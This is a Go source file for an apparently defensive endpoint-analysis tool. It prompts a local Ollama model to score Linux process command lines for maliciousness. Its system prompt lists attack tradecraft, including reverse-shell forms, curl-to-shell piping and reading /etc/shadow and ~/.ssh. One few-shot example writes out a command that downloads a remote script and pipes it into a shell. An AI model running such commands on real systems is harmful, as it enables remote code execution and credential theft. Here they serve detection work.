package analyzer

// Ollama backend: lifted from P2's scorer/llm.go, adapted to score a
// types.Event. System prompt, few-shot pairs, and the balanced-brace JSON
// extractor are preserved verbatim — that is the tuned P2 IP.

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"exectrace/internal/types"
)

// systemPrompt frames the model as a Linux endpoint analyst and pins the output
// shape.
const systemPrompt = `You are a Linux endpoint security analyst. You are given a single process execution (the command line plus a little context) and must judge how likely it is to be malicious.

Reply with ONLY a single JSON object, no prose, with exactly these keys:
{"risk_score": <float 0..1, probability the command is malicious>,
 "verdict": "benign"|"suspicious"|"malicious",
 "reason": "<short human explanation>",
 "mitre": ["<MITRE ATT&CK technique IDs, e.g. T1059>"],
 "risk_indicators": ["<short tokens, e.g. curl|sh>"]}

Linux tradecraft that raises risk:
- piping a downloader into a shell (curl/wget ... | sh|bash)
- executing from world-writable/temp dirs (/tmp, /dev/shm, /var/tmp)
- base64/xxd/openssl-decoded payloads fed to an interpreter
- reverse shells (bash -i >& /dev/tcp/..., nc -e, mkfifo+sh)
- LD_PRELOAD / LD_LIBRARY_PATH hijacks
- touching credentials/persistence (/etc/shadow, ~/.ssh, cron, systemd units)
- chmod +x on a freshly dropped file

Benign administrative commands (package managers, ls, cat, git, normal service
restarts) should score LOW even when they superficially resemble the above.`

var fewShot = []struct {
	Command string
	JSON    string
}{
	{
		Command: "apt-get update",
		JSON:    `{"risk_score":0.03,"verdict":"benign","reason":"routine package index refresh","mitre":[],"risk_indicators":[]}`,
	},
	{
		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script downloaded and piped straight into a shell","mitre":["T1059","T1105"],"risk_indicators":["curl|sh"]}`,
	},
	{
		Command: "gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js",
		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","mitre":[],"risk_indicators":[]}`,
	},
}

// mitreRe matches valid MITRE ATT&CK technique IDs (e.g. T1059, T1059.004).
var mitreRe = regexp.MustCompile(`^T\d{4}(\.\d{3})?$`)

// validVerdicts is the allowed verdict label set.
var validVerdicts = map[string]bool{"benign": true, "suspicious": true, "malicious": true}

// keepValidMitre drops hallucinated/malformed technique IDs.
func keepValidMitre(in []string) []string {
	out := []string{}
	for _, m := range in {
		if m = strings.TrimSpace(m); mitreRe.MatchString(m) {
			out = append(out, m)
		}
	}
	return out
}

// ollamaClient scores commands via a local Ollama server running a small model.
type ollamaClient struct {
	endpoint string
	model    string
	http     *http.Client
}

func newOllamaClient(model string) *ollamaClient {
	return &ollamaClient{
		endpoint: "http://localhost:11434/api/generate",
		model:    model,
		http:     &http.Client{Timeout: 60 * time.Second},
	}
}

func (c *ollamaClient) name() string { return "ollama:" + c.model }

type ollamaRequest struct {
	Model   string         `json:"model"`
	Prompt  string         `json:"prompt"`
	Stream  bool           `json:"stream"`
	Format  string         `json:"format,omitempty"`
	Options map[string]any `json:"options"`
}

type ollamaResponse struct {
	Response string `json:"response"`
	Done     bool   `json:"done"`
}

func (c *ollamaClient) score(ctx context.Context, e types.Event) (scoreResult, error) {
	reqBody, err := json.Marshal(ollamaRequest{
		Model:   c.model,
		Prompt:  buildPrompt(e),
		Stream:  false,
		Format:  "json",
		Options: map[string]any{"temperature": 0, "num_predict": 256},
	})
	if err != nil {
		return scoreResult{}, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.endpoint, bytes.NewReader(reqBody))
	if err != nil {
		return scoreResult{}, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.http.Do(req)
	if err != nil {
		return scoreResult{}, fmt.Errorf("ollama request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return scoreResult{}, err
	}
	if resp.StatusCode != http.StatusOK {
		return scoreResult{}, fmt.Errorf("ollama status %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
	}

	var or ollamaResponse
	if err := json.Unmarshal(body, &or); err != nil {
		return scoreResult{}, fmt.Errorf("decode ollama envelope: %w", err)
	}
	return parseResult(or.Response)
}

// buildPrompt assembles the system framing, few-shot pairs, and the command
// under test with any high-signal context.
func buildPrompt(e types.Event) string {
	var b strings.Builder
	b.WriteString(systemPrompt)
	b.WriteString("\n\nExamples:\n")
	for _, ex := range fewShot {
		fmt.Fprintf(&b, "COMMAND: %s\nJSON: %s\n", ex.Command, ex.JSON)
	}
	b.WriteString("\nNow score this execution. Respond with ONLY the JSON object.\n")
	if e.Executable != "" {
		fmt.Fprintf(&b, "executable: %s\n", e.Executable)
	}
	if e.Comm != "" {
		fmt.Fprintf(&b, "process: %s\n", e.Comm)
	}
	fmt.Fprintf(&b, "COMMAND: %s\nJSON: ", commandLine(e))
	return b.String()
}

type rawResult struct {
	RiskScore      *float64 `json:"risk_score"`
	Verdict        string   `json:"verdict"`
	Reason         string   `json:"reason"`
	Mitre          []string `json:"mitre"`
	RiskIndicators []string `json:"risk_indicators"`
}

// parseResult extracts the JSON object from the model output, clamps the score
// to [0,1], and fills a missing verdict from the band.
func parseResult(text string) (scoreResult, error) {
	js, err := extractJSON(text)
	if err != nil {
		return scoreResult{}, err
	}
	var raw rawResult
	if err := json.Unmarshal([]byte(js), &raw); err != nil {
		return scoreResult{}, fmt.Errorf("parse model JSON: %w", err)
	}
	score := 0.0
	if raw.RiskScore != nil {
		score = *raw.RiskScore
	}
	if score < 0 {
		score = 0
	}
	if score > 1 {
		score = 1
	}
	verdict := strings.ToLower(strings.TrimSpace(raw.Verdict))
	if !validVerdicts[verdict] {
		verdict = verdictForScore(score)
	}
	return scoreResult{
		RiskScore:      score,
		Verdict:        verdict,
		Reason:         strings.TrimSpace(raw.Reason),
		Mitre:          keepValidMitre(raw.Mitre),
		RiskIndicators: raw.RiskIndicators,
	}, nil
}

// extractJSON pulls the first balanced {...} object out of arbitrary text,
// ignoring braces inside JSON strings.
func extractJSON(text string) (string, error) {
	start := strings.IndexByte(text, '{')
	if start < 0 {
		return "", errors.New("no JSON object in model output")
	}
	depth := 0
	inStr := false
	esc := false
	for i := start; i < len(text); i++ {
		ch := text[i]
		if inStr {
			switch {
			case esc:
				esc = false
			case ch == '\\':
				esc = true
			case ch == '"':
				inStr = false
			}
			continue
		}
		switch ch {
		case '"':
			inStr = true
		case '{':
			depth++
		case '}':
			depth--
			if depth == 0 {
				return text[start : i+1], nil
			}
		}
	}
	return "", errors.New("unbalanced JSON object in model output")
}
